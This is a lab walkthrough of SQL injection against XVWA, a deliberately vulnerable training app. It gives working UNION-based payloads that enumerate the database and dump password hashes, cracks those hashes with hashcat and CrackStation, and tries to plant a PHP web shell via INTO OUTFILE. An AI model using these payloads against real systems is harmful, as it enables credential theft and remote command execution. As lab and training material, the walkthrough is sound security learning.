# Exploiting SQLi

## 1. Confirm injection


Check if it is vulnerable
```sql
'
```
Second check
```sql
' OR 1=1 -- -
```

## 2. Get number of fields used in the query
```sql
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -
' ORDER BY 4 -- -
' ORDER BY 5 -- -
' ORDER BY 6 -- -
' ORDER BY 7 -- -
```

## 3. Place fields in the interface
```sql
1000' UNION SELECT 1, 2, 3, 4, 5, 6, 7 -- -
```

## 4. Get some information
```sql
1000' UNION SELECT 1, DATABASE(), 3, USER(), VERSION(), 6, 7 -- -
```

**Output obtained**
```
xvwa,root,8.0.23-0ubuntu0.20.04.1
```

## 5. Get tables in database
```sql
1000' UNION SELECT 1, 2, 3, 4, GROUP_CONCAT(table_name), 6, 7 FROM information_schema.tables WHERE table_schema='xvwa' -- -
```

**Output obtained**
```
caffaine,comments,users
```

## 6. Get columns from table `users`
```sql
1000' UNION SELECT 1, 2, 3, 4, GROUP_CONCAT(column_name), 6, 7 FROM information_schema.columns WHERE table_schema='xvwa' AND table_name='users' -- -
```

**Output obtained**
```
uid,username,password
```

## 7. Get records from table `users`
```sql
1000' UNION SELECT 1, 2, 3, 4, GROUP_CONCAT(uid, ':', username, ':', password, ' - '), 6, 7 FROM users LIMIT 1 -- -
```

**Output obtained**
```
1:admin:21232f297a57a5a743894a0e4a801fc3 
2:xvwa:570992ec4b5ad7a313f5dc8fd0825395
3:user:25890deab1075e916c06b9e1efc2e25f 
```

## 8. Crack passwords

Hashes seems to be MD5:

```shell
❯ hash-identifier '21232f297a57a5a743894a0e4a801fc3'
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Using `hashcat` to crack it:

```shell
❯ hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i5-1155G7 @ 2.50GHz, 6828/13720 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

21232f297a57a5a743894a0e4a801fc3:admin                    
25890deab1075e916c06b9e1efc2e25f:vulnerable   
```

Only cracked two of the three passwords, cracking last password with [Crackstation](https://crackstation.net):

```
21232f297a57a5a743894a0e4a801fc3	md5	admin
570992ec4b5ad7a313f5dc8fd0825395	md5	xvwa
25890deab1075e916c06b9e1efc2e25f	md5	vulnerable
```

## 9. Bonus: Try to upload a shell

As database is running under root user, it would be interesting try to upload shell executing commands as root:

```sql
1000' UNION SELECT '<?php system($_GET["cmd"]); ?>', '', '', '', '', '', '' INTO OUTFILE '/var/www/html/xvwa/shell.php' -- -
```

But unfortunately we have no permissions to it:

```
Fatal error: Uncaught mysqli_sql_exception: The MySQL server is running with the --secure-file-priv option so it cannot execute this statement in /var/www/html/xvwa/vulnerabilities/sqli/home.php:61 Stack trace: #0 /var/www/html/xvwa/vulnerabilities/sqli/home.php(61): mysqli->query() #1 /var/www/html/xvwa/vulnerabilities/sqli/index.php(50): include('/var/www/html/x...') #2 {main} thrown in /var/www/html/xvwa/vulnerabilities/sqli/home.php on line 61
```

